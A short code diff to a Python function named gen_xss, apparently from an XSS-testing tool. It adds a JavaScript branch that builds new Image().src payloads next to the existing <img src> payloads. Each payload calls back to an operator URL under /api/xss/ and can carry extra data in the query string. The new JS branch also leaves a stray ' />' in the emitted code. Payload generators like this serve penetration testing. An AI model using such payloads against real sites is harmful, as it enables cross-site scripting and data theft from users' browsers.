@@ -148,10 +148,16 @@ def gen_xss(id):
             payload += """</script>"""
 
     else:
-        if other_data != '""':
-            payload += """<img src="{}/api/xss/{}/{}?{}" />""".format(url, xss_type, guid, other_data.lstrip('"').lstrip('&').rstrip('"'))
+        if code_type == 'js': 
+            if other_data != '""':
+                payload += """new Image().src="{}/api/xss/{}/{}?{}" />""".format(url, xss_type, guid, other_data.lstrip('"').lstrip('&').rstrip('"'))
+            else:
+                payload += """new Image().src="{}/api/xss/{}/{}" />""".format(url, xss_type, guid)
         else:
-            payload += """<img src="{}/api/xss/{}/{}" />""".format(url, xss_type, guid)
+            if other_data != '""':
+                payload += """<img src="{}/api/xss/{}/{}?{}" />""".format(url, xss_type, guid, other_data.lstrip('"').lstrip('&').rstrip('"'))
+            else:
+                payload += """<img src="{}/api/xss/{}/{}" />""".format(url, xss_type, guid)
 
     return (payload)
 
